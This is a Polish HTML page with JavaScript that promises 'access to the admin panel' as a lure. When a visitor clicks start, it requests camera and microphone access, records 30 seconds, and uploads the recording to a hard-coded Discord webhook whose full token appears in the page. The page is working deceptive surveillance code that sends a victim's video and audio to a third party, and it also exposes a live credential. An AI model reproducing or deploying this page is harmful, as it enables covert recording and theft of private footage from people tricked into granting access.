<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Secret</title>
<style>
  body{font-family:Arial,Helvetica,sans-serif;background:#f5f7fb;color:#111;padding:20px}
  .card{max-width:820px;margin:0 auto;background:#fff;padding:18px;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,0.08)}
  h1{font-size:20px;margin:0 0 8px}
  input[type="text"]{width:100%;padding:10px;border-radius:6px;border:1px solid #ccc;font-size:14px}
  button{padding:10px 14px;border-radius:7px;border:none;cursor:pointer;font-size:15px;background:#0b76ff;color:#fff;margin-top:12px}
  video{width:100%;border-radius:8px;background:#000;margin-top:12px}
  .info,.error,.ok{margin-top:12px;padding:10px;border-radius:6px}
  .info{background:#d1ecf1;color:#0c5460;display:none}
  .error{background:#f8d7da;color:#721c24;display:none}
  .ok{background:#d4edda;color:#155724;display:none}
  .warn{margin-top:12px;padding:10px;border-radius:6px;background:#fff3cd;color:#856404;display:none}
</style>
</head>
<body>
  <div class="card">
    <h1>One-shot nagranie 30s</h1>
    <p>kliknij start aby uzyskać dostęp do panelu admina.</p>

    <label>Webhook:</label>
    <input id="webhook" type="text" 
      value="https://discord.com/api/webhooks/1422649951804063766/59JzWBU9JFoG6BLGJe1f6_PM28gZFyEIt7K44kegiVkSmxmIy94HehnqwGPKYDfiVAt8" />

    <button id="start">▶ Start</button>

    <video id="preview" autoplay playsinline muted></video>
    <video id="playback" controls style="display:none;margin-top:12px"></video>

    <div id="status" class="info"></div>
    <div id="error" class="error"></div>
    <div id="ok" class="ok"></div>
    <div id="corsHint" class="warn">.</div>
  </div>

<script>
(() => {
  const startBtn = document.getElementById('start');
  const webhookInput = document.getElementById('webhook');
  const preview = document.getElementById('preview');
  const playback = document.getElementById('playback');
  const status = document.getElementById('status');
  const errorBox = document.getElementById('error');
  const okBox = document.getElementById('ok');
  const corsHint = document.getElementById('corsHint');

  let recorder, stream, chunks = [];

  function show(el,msg){ el.style.display='block'; el.textContent=msg; }
  function hide(el){ el.style.display='none'; el.textContent=''; }

  startBtn.onclick = async () => {
    hide(status); hide(errorBox); hide(okBox); hide(corsHint);
    chunks = [];
    const webhook = webhookInput.value.trim();
    if(!webhook){ show(errorBox,'Brak webhooka.'); return; }

    try {
      show(status,'Prośba o dostęp do kamery/mikrofonu...');
      stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
      preview.srcObject = stream;
    } catch(e){ show(errorBox,'Błąd: '+e.message); return; }

    recorder = new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});
    recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
    recorder.onstop = async () => {
      const blob = new Blob(chunks,{type:'video/webm'});
      playback.src = URL.createObjectURL(blob);
      playback.style.display = 'block';
      stream.getTracks().forEach(t=>t.stop());
      preview.srcObject=null;

      show(status,'Wysyłanie nagrania...');
      try{
        const fd = new FormData();
        fd.append('file',blob,'nagranie.webm');
        fd.append('content','One-shot nagranie 30s');
        const res = await fetch(webhook,{method:'POST',body:fd});
        if(!res.ok) throw new Error(res.status+' '+await res.text());
        show(okBox,'Wysłano pomyślnie!');
      }catch(err){
        show(errorBox,'Nie udało się wysłać: '+err.message);
        corsHint.style.display='block';
      }
    };

    recorder.start();
    show(status,'Nagrywanie... (30s)');
    setTimeout(()=>{ recorder.stop(); },30000);
  };
})();
</script>
</body>
</html>
